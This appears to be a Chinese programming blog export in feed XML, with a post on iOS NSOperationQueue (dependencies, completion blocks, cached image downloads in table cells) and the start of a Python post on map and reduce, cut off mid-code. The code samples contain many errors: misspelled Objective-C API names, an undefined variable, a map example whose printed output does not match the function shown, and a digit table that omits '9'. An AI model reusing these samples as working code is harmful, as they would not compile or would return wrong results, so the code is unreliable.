<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">//创建队列，默认是并发队列</div><div class="line">NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">//设置最大并发数,限制开线程的数目</div><div class="line">queue.maxConcurrentOperation = 5;</div><div class="line">//同一时间最多有多少个任务可以执行，如果设置为1可以看成是串行执行任务，串行执行任务不等于只开一条线程，只是线程同步。</div><div class="line">//如果这个值大于1就是并发队列，等于0就是不执行任务，等于-1是特殊意义，代表最大值</div><div class="line">queue.maxConcurrentOperationCount = 1;</div><div class="line">//线程有一个是否暂停的属性，设置为YES为暂停，NO即为恢复</div><div class="line">[queue setSuspend:YES];</div><div class="line">//取消操作,取消是无法恢复的，这个方法内部实质上是调用了所有任务的cancel方法</div><div class="line">[queue cancelAllOperations];</div><div class="line"></div><div class="line">//队列中的任务是有状态的：已经执行完毕的 | 正在执行 | 排队等待状态，正在执行状态的任务是无法取消的</div></pre></td></tr></table></figure>
<p>但是我们有一点需要注意，如果我们把操作封装了一下，放在一个类里面，那么结果就会大不一样，因为暂停的单位是队列中的任务，如果我们将所有的操作都封装在一个类里面，那么总共就只会有一个任务，那就是正在执行中的任务，正在执行的任务是无法取消的，所以暂停和取消也是无效的，但是我们可以在那个封装的类中加一个判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//只要添加了这条语句之后，那么就可以实现封装中的暂停操作了</div><div class="line">if(self.isCancelled) return;</div></pre></td></tr></table></figure>
<h2 id="操作依赖监听和线程间通信"><a href="#操作依赖监听和线程间通信" class="headerlink" title="操作依赖监听和线程间通信"></a>操作依赖监听和线程间通信</h2><p>在GCD中我们可以通过栅栏函数去实现对于队列中的任务执行顺序的要求，那么在NSOperation中我们是通过操作依赖的方式，这样我们就可以任意调整任务执行的顺序了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">//添加操作依赖</div><div class="line">//注意点：不能循环依赖</div><div class="line">[op1 addDependency:op4];</div><div class="line">[op4 addDependency:op3];</div><div class="line">[op3 addDependency:op2];  </div><div class="line"></div><div class="line">//这个强大的一点还在于它可以跨队列依赖</div><div class="line">[queue addOperation:op1];</div><div class="line">[queue addOperation:op2];</div><div class="line">[queue addOperation:op3];</div><div class="line">[queue2 addOperation:op4];</div></pre></td></tr></table></figure>
<p>那么我们可能有这样的一个需求，需要在任务完成之后发一条消息，类似于GCD中的队列组，队列中的任务完成后会发一个通知，不同的是，这里的监听是针对于任务的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//操作监听</div><div class="line">op3.conpletionBlock = ^&#123;</div><div class="line">  NSLog(@&quot;任务执行完毕&quot;)；  </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-13%20%E4%B8%8A%E5%8D%8811.07.26.png" alt="屏幕快照 2017-11-13 上午11.07.26.png" title="" class="">
                <p>屏幕快照 2017-11-13 上午11.07.26.png</p>
            </figure>
<p>我们可以看到虽然添加了监听，但因为是异步执行的，所以他们并不一定在同一个线程执行，也不一定任务3执行完成后就会接着监听动作，如果我修改了最大并发数为1那么就可以看到任务3执行完就紧跟着监听的结果了。</p>
<p>然后我们再来看看一个老生常谈的话题，那就是线程间通信，之前的<code>NSThread</code>和<code>GCD</code>中我们都已经讲过，现在看看<code>NSOperation</code>中是如何实现的，这里同样以下载图片为例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">//封装操作</div><div class="line">NSBlockOperation *download = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">   NSURL *url = [NSURL URLWithString:@&quot;http://taobao.com/1.jpg&quot;];</div><div class="line">   NSData *data = [NSData dataWithContentsOfURL:url];</div><div class="line">   UIImage *image = [UIImage imageWithData:imageData];</div><div class="line">  </div><div class="line">   //更新UI</div><div class="line">   [[NSOperationQueue mainQueue] addOperationWithBlock:^&#123;</div><div class="line">      self.imageView.image = image; </div><div class="line">   &#125;];</div><div class="line">&#125;];</div><div class="line">[queue addOperation:download];</div></pre></td></tr></table></figure>
<p>下面以一个下载合并多张图片的的例子，将前面的知识进行一次综合应用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">- (void)test1&#123;</div><div class="line">    NSOperationQueue *queue = [[NSOperationQueue alloc] init];</div><div class="line">    __block UIImage *image1 = [[UIImage alloc] init];</div><div class="line">    __block UIImage *image2 = [[UIImage alloc] init];</div><div class="line">    //封装操作</div><div class="line">    NSBlockOperation *download1 = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">        NSURL *url = [NSURL URLWithString:@&quot;https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/faedab64034f78f0e7534b1a7b310a55b2191cfa.jpg&quot;];</div><div class="line">        NSData *imageData = [NSData dataWithContentsOfURL:url];</div><div class="line">        image1 = [UIImage imageWithData:imageData];</div><div class="line">        NSLog(@&quot;1------%@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;];</div><div class="line">    NSBlockOperation *download2 = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">        NSURL *url = [NSURL URLWithString:@&quot;https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/faedab64034f78f0e7534b1a7b310a55b2191cfa.jpg&quot;];</div><div class="line">        NSData *imageData = [NSData dataWithContentsOfURL:url];</div><div class="line">        image2 = [UIImage imageWithData:imageData];</div><div class="line">        NSLog(@&quot;2-----%@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    NSBlockOperation *combile = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">        //开上下文</div><div class="line">        UIGraphicsBeginImageContext(CGSizeMake(200, 200));</div><div class="line">        [image1 drawInRect:CGRectMake(0, 0, 100, 200)];</div><div class="line">        [image2 drawInRect:CGRectMake(100, 0, 100, 200)];</div><div class="line">        </div><div class="line">        UIImage *image = UIGraphicsGetImageFromCurrentImageContext();</div><div class="line">        //关闭上下文</div><div class="line">        UIGraphicsEndImageContext();</div><div class="line">        //回到主线程</div><div class="line">        [[NSOperationQueue mainQueue] addOperationWithBlock:^&#123;</div><div class="line">            self.imageView.image = image;</div><div class="line">        &#125;];</div><div class="line">        NSLog(@&quot;combile-----%@&quot;, [NSThread currentThread]);</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    [combile addDependency:download1];</div><div class="line">    [combile addDependency:download2];</div><div class="line">    </div><div class="line">    [queue addOperation:download1];</div><div class="line">    [queue addOperation:download2];</div><div class="line">    [queue addOperation:combile];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行之后效果如图：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-13%20%E4%B8%8B%E5%8D%881.41.06.png" alt="屏幕快照 2017-11-13 下午1.41.06.png" title="" class="">
                <p>屏幕快照 2017-11-13 下午1.41.06.png</p>
            </figure></p>
<p>那么多线程在实际应用中到底有什么作用呢？说到这里的话就要提到我们的App有时候需要从网上加载图片，如果我们只是加载一两张图片还好，如果我们在TableView的cell中加载图片（每个cell都有），那么我们就会发现整个App的UI界面会非常的卡顿，简直就跟用了几年的安卓手机一样，这是因为我们把下载图片全部丢到了主线程中，而主线程是刷新UI的，还有一个问题就是图片会重新下载，这个时候我们的多线程就派上了用场。 </p>
<h2 id="多图下的优化问题"><a href="#多图下的优化问题" class="headerlink" title="多图下的优化问题"></a>多图下的优化问题</h2><p>我们已经下载过一次的图片自然不可能重新去下载，所以我们需要程序的缓存，否则对流量的消耗和程序的流畅性影响都很大，只有将这个和多线程结合在一起才能形成一个完成的App，现在就着手去解决这两个问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">//1.UI不流畅----&gt;开子线程下载图片</div><div class="line">//2.图片重复下载----&gt;先把之前下载过的图片保存起来</div><div class="line"></div><div class="line">//创建缓存字典</div><div class="line">@property (nonatomic, strong) NSMutableDictionary *images;</div><div class="line"></div><div class="line">//字典初始化</div><div class="line">- (NSMutableDictionary *)images&#123;</div><div class="line">    if(_images == nil)&#123;</div><div class="line">        _images = [[NSMuatbleDictionary alloc] init];</div><div class="line">    &#125;</div><div class="line">  return _images;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//cell代理方法中的处理</div><div class="line"></div><div class="line">//先去查看内存缓存中该图片是否存在，存在就直接拿来用，否则去检查磁盘缓存</div><div class="line">//如果有磁盘缓存，就保存一份到内存，否则就下载</div><div class="line">UIImage *image = [self.images objectForKey:appM.icon];</div><div class="line">if (image)&#123;</div><div class="line">    cell.imageView.image = image;</div><div class="line">&#125;else&#123;</div><div class="line">  	NSString *caches = [NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES) lastObject];</div><div class="line">  	NSString *filenName = [appM.icon lastPathComponent];</div><div class="line">  	NSString *fullPath = [caches stringByAppendingPathComponent:fileName];</div><div class="line">  	//检查磁盘缓存</div><div class="line">  	NSData *imageData = [NSData dataWithContentsOfFile:fullPath];</div><div class="line">  	if(imageData)&#123;</div><div class="line">        UIImage *image = [UIImage imageWithData:imageData];</div><div class="line">      	cell.imageView.image = image;</div><div class="line">      	//将图片保存到内存缓存</div><div class="line">      	[self.images setObject:image forKey:appM.icon];</div><div class="line">    &#125;else&#123;</div><div class="line">        NSURL *url = [NSYRL URLWithString:appM.icon];</div><div class="line">  		NSData *imageData = [NSData dataWithContentsOfURL:url];</div><div class="line">  		UIImage *image = [UIImage imageWithData:imageData];</div><div class="line">  		cell.imageView.image = image;</div><div class="line">  		//将图片保存到内存缓存</div><div class="line">  		[self.images setObject:image forKey:appM.icon];</div><div class="line">  		//写数据到沙盒</div><div class="line">  		[imageData writeToFile:fullPath atomically:YES];</div><div class="line">   	 &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p> 那么缓存的问题到这里已经比较完善的解决了，接下来就是解决UI不流畅的问题，也就是我们需要开一个子线程去下载图片，只需要修改下载的时候即可：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">//创建一个队列的属性并实现懒加载</div><div class="line">@property(nonatomic, strong) NSOperationQueue *queue;</div><div class="line"></div><div class="line">- (NSOperationQueue *)queue&#123;</div><div class="line">    if(_queue == nil)&#123;</div><div class="line">        _queue = [[NSOperationQueue alloc] init];</div><div class="line">      	_queue.maxConcurrentOperationCount = 5;</div><div class="line">    &#125;</div><div class="line">  	return _queue;</div><div class="line">&#125;</div><div class="line"></div><div class="line">NSBlockOperation *download = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">    	NSURL *url = [NSYRL URLWithString:appM.icon];</div><div class="line">  		NSData *imageData = [NSData dataWithContentsOfURL:url];</div><div class="line">  		UIImage *image = [UIImage imageWithData:imageData];</div><div class="line">  		//将图片保存到内存缓存</div><div class="line">  		[self.images setObject:image forKey:appM.icon];</div><div class="line">		[[NSOperationQueue mainQueue] addOperationWirhBlock:^&#123;</div><div class="line">            cell.imageView.image = image;</div><div class="line">        &#125;];</div><div class="line">  		//写数据到沙盒</div><div class="line">  		[imageData writeToFile:fullPath atomically:YES];</div><div class="line">	&#125;];</div><div class="line">[self.queue addOperation:download];</div></pre></td></tr></table></figure>
<p>显然正常来说上面的这份代码应该是没什么问题了，但是我们会发现在网速不太良好的情况下会出现重复下载的情况，原因就是我们在TableView初始化的时候往下滑动再往上滑动，这个时候第一个图片本来处理下载状态还没下好，滑上去之后就会再进行一次判断，然后就会再下载一次了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">//我们只需要做一个操作缓存即可，就像之前的图片一样，先定义一个字典</div><div class="line">@property (nonatomic ,strong) NSMutaleDictionary *operations</div><div class="line"></div><div class="line">//判断语句</div><div class="line">NSBlockOperation *download = [self.operations objectForKey:appM.icon];</div><div class="line">if(download)&#123;</div><div class="line">    //如果已经添加操作就什么也不做，等待即可</div><div class="line">&#125;else&#123;</div><div class="line">    NSBlockOperation *download = [NSBlockOperation blockOperationWithBlock:^&#123;</div><div class="line">    	NSURL *url = [NSURL URLWithString:appM.icon];</div><div class="line">  		NSData *imageData = [NSData dataWithContentsOfURL:url];</div><div class="line">  		UIImage *image = [UIImage imageWithData:imageData];</div><div class="line">      	//容错处理</div><div class="line">      	if(image == nil)&#123;</div><div class="line">            [self.operations removeObjectForKey:appM.icon];</div><div class="line">          	return;</div><div class="line">        &#125;</div><div class="line">      	//将图片保存到内存缓存</div><div class="line">  		[self.images setObject:image forKey:appM.icon];</div><div class="line">		[[NSOperationQueue mainQueue] addOperationWirhBlock:^&#123;</div><div class="line">            [self.tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewAnimationLeft];</div><div class="line">        &#125;];</div><div class="line">  		//写数据到沙盒</div><div class="line">  		[imageData writeToFile:fullPath atomically:YES];</div><div class="line">      	</div><div class="line">      	//下载完成后移除下载操作</div><div class="line">      	[self.operations removeObjectForKey:appM.icon];</div><div class="line">	&#125;];</div><div class="line">	[self.queue addOperation:download];    </div><div class="line">	//添加操作到操作缓存中</div><div class="line">	[self.operations setObject:download forKey:appM.icon]; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>还有一个问题就是图片不会显示，需要我们下滑上滑去刷新一次，这就是因为在cell的subtitle状态下，图片的<code>frame</code>默认是为0的(内存中还没有图片)，就算真实的图片赋值过去，因为<code>frame</code>是0，所以依旧不会显示，解决这个问题我们就只需要手动刷新即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">[[NSOperationQueue mainQueue] addOperationWirhBlock:^&#123;</div><div class="line">            //cell.imageView.image = image;</div><div class="line">  			[self.tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewAnimationLeft];</div><div class="line">        &#125;];</div></pre></td></tr></table></figure>
<p>但是这个时候我们又会发现一个新的问题就是数据错乱，这个图片和实际的数据有时候并不搭配，也就是数据错乱，这是因为重用了之前的cell的图片，因为本身的图片还没有下载好：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if(download)&#123;</div><div class="line">    //如果已经添加操作就什么也不做，等待即可</div><div class="line">&#125;else&#123;</div><div class="line">	//这个问题很简单，只需要在下载的时候先清空原有的图片即可，或者设置一个占位图片</div><div class="line">	cell.imageView.image = [UIImage imageNamed:@&quot;占位&quot;];</div><div class="line"> 	//省略中间</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个多图下载的优化还是有很多的问题的，在这里总结一个整个过程的思维导图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-11-14%20%E4%B8%8A%E5%8D%881.07.48.png" alt="屏幕快照 2017-11-14 上午1.07.48.png" title="" class="">
                <p>屏幕快照 2017-11-14 上午1.07.48.png</p>
            </figure>
<p>最后补充的一点就是内存占用的问题，当图片过多的时候就会爆出内存警告，我们需要小小的优化一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">- (void)didRecieveMemoryWarning&#123;</div><div class="line">    [self.images removeAllObjects];</div><div class="line">  	[self.queue cacelAllObjections];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><ul>
<li><a href="http://www.jianshu.com/p/0c241a4918bf" target="_blank" rel="external">奔跑的炸鸡</a>  </li>
<li>小码哥教程(buy it by yourself)</li>
</ul>
]]></content>
      
        <categories>
            
            <category> NSOperation 多图下载优化 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> iOS开发 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python-函数式编程]]></title>
      <url>/2017/11/06/Python-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>当看到函数式编程的语法的时候就感觉自己被深深的吸引了，这是养成函数式编程范式的第一步。</p>
<a id="more"></a>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>也许继面向对象之后，函数式编程会成为下一个主流的编程范式，其实与其在语言中说这个不如说是函数式编程的思想。首先函数式编程的代码非常容易理解，偏向自然语言，而且函数式编程不依赖也不会改变外界的状态。因此每一个函数都可以看作独立单元，这样有利于模块化组合。</p>
<p>其次它有利于并发编程，我们不需要去考虑死锁的问题，因为它根本不会修改变量，所以我们可以很放心的把任务分摊到多个线程，部署并发编程。</p>
<h2 id="map-reduce"><a href="#map-reduce" class="headerlink" title="map/reduce"></a>map/reduce</h2><p>显然map/reduce是函数式编程中非常经典的部分了，首先看看map，<code>map()</code>函数接受两个参数，一个是函数，一个是<code>Iterable</code>，<code>map</code>将传入的函数依次作用于序列中的每一个元素，并把结果作为新的<code>Iterator</code>返回（Python3中是这样，而在python2中返回的仍然是一个<code>Interable</code>）.下面举个例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></div><div class="line">...		<span class="keyword">return</span> x</div><div class="line">...</div><div class="line">&gt;&gt;&gt;r = map(f, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>])</div><div class="line">&gt;&gt;&gt;list(r)</div><div class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">64</span>, <span class="number">81</span>]</div></pre></td></tr></table></figure>
<p>这里因为<code>map()</code>返回的是一个<code>Interator</code>，<code>Interator</code>是一个惰性序列，因此通过<code>list()</code>函数计算出整个序列返回。虽然这个我们使用for循环同样可以做到，但是无法一眼看出来目的，而且代码冗长。</p>
<p>所以,<code>map()</code>作为高阶函数，事实上他把运算规则抽象了，我们除了计算上面的之外还可以计算任意复杂的函数，如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>list(map(str, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]))</div><div class="line">[<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>]</div></pre></td></tr></table></figure>
<p>再看<code>reduce</code>的用法。<code>reduce</code>把一个函数作用在一个序列<code>[x1, x2, x3, ...]</code>上，这个函数必须接收两个参数，<code>reduce</code>把结果继续和序列的下一个元素做累积计算，其效果就是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt;<span class="keyword">from</span> functools <span class="keyword">import</span> reduce</div><div class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(x, y)</span>:</span></div><div class="line">...		<span class="keyword">return</span> x+y</div><div class="line">...</div><div class="line">&gt;&gt;&gt;reduce(add, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>])</div><div class="line"><span class="number">25</span></div></pre></td></tr></table></figure>
<p>因为python中已经有<code>sum()</code>内置函数做加法了，如果这个时候要将上面的列表变成<code>13579</code>，reduce就可以派上用场了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">fn</span><span class="params">(x, y)</span>:</span></div><div class="line"><span class="meta">... </span>    <span class="keyword">return</span> x * <span class="number">10</span> + y</div><div class="line">...</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>reduce(fn, [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>])</div><div class="line"><span class="number">13579</span></div></pre></td></tr></table></figure>
<p>这个例子本身没有多大用，如果考虑到字符串也是一个序列，对上面的例子稍加改动，配合<code>map()</code>，就可以自己手写一个<code>str</code>转<code>int</code>了，这里先提前使用一下lambda函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</div><div class="line"></div><div class="line">keys = [str(x) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">9</span>)]</div><div class="line">values = range(<span class="number">9</span>)</div><div class="line">the_dict = dict(zip(keys, values))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">char2num</span><span class="params">(s)</span>:</span></div><div class="line">	<span class="keyword">return</span> the_dict[s]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * <span class="number">10</span> + y, map(char2num, s))</div></pre></td></tr></table></figure>
<p>这样就算不掉用python的<code>int()</code>函数也可以自己写一个将字符串转换成整数的函数，下面就来做几个练习来巩固一下；</p>
<ol>
<li>利用<code>map()</code>函数，把用户输入的不规范的英文名字，变为首字母大写，其他小写的规范名字。输入：<code>[&#39;adam&#39;, &#39;LISA&#39;, &#39;barT&#39;]</code>，输出：<code>[&#39;Adam&#39;, &#39;Lisa&#39;, &#39;Bart&#39;]</code>：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></div><div class="line">    <span class="keyword">return</span> name[<span class="number">0</span>].upper()+name[<span class="number">1</span>:].lower()</div><div class="line">L1 = [<span class="string">'adam'</span>, <span class="string">'LISA'</span>, <span class="string">'barT'</span>]</div><div class="line">L2 = list(map(normalize, L1))</div><div class="line">print(L2)</div></pre></td></tr></table></figure>
<ol>
<li>Python的<code>sum()</code>函数可以接受一个list并求和，编写一个<code>prod()</code>函数，可以接受一个list并利用reduce()求积：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">prod</span><span class="params">(L)</span>:</span></div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, L)</div></pre></td></tr></table></figure>
<ol>
<li>利用<code>map</code>和<code>reduce</code>编写一个<code>str2float</code>函数，把字符串<code>&#39;123.456&#39;</code>转换成浮点数<code>123.456</code>：</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division <span class="comment">#兼容python2</span></div><div class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2int</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">char2num</span><span class="params">(c)</span>:</span></div><div class="line">        <span class="keyword">return</span> &#123;<span class="string">'0'</span>: <span class="number">0</span>, <span class="string">'1'</span>: <span class="number">1</span>, <span class="string">'2'</span>: <span class="number">2</span>, <span class="string">'3'</span>: <span class="number">3</span>, <span class="string">'4'</span>: <span class="number">4</span>, <span class="string">'5'</span>: <span class="number">5</span>,<span class="string">'6'</span>: <span class="number">6</span>, <span class="string">'7'</span>: <span class="number">7</span>, <span class="string">'8'</span>: <span class="number">8</span>, <span class="string">'9'</span>: <span class="number">9</span>&#125;[c]</div><div class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x *<span class="number">10</span> + y, map(char2num, s))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span><span class="params">(s)</span>:</span></div><div class="line">    s_list = s.split(<span class="string">'.'</span>)            </div><div class="line">    float_i = str2int(s_list[<span class="number">0</span>])     </div><div class="line">    float_f = <span class="number">0.1</span></div><div class="line">    float_f = str2int(s_list[<span class="number">1</span>]) / (<span class="number">10</span>**len(s_list[<span class="number">1</span>]))</div><div class="line">    <span class="keyword">return</span> float_i + float_f</div><div 